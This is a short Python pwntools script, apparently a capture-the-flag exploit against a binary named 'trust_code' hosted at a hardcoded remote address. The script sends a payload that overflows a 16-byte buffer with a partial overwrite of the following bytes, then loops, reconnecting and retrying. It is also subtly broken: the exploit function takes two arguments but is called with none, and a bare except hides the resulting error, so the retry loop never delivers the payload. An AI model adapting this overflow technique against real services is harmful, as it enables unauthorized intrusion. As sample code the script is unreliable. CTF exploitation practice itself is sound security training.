#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '35.190.227.47', 10009
binary = './trust_code'
brkpts = '''
b service
c
'''

elf = ELF("trust_code")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "DEBUG"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

def exp(byte, byte2):
    sa("iv> ", "b"*0x10 + "a"*8 + "\x32" + "\x56")
    sa("code> ", "c"*0x30)
    print(io.recv())

if __name__ == "__main__":
    while True:
        try:
            io = remote(remote_ip, port)
            exp()
            io.close()
        except:
            io.close()
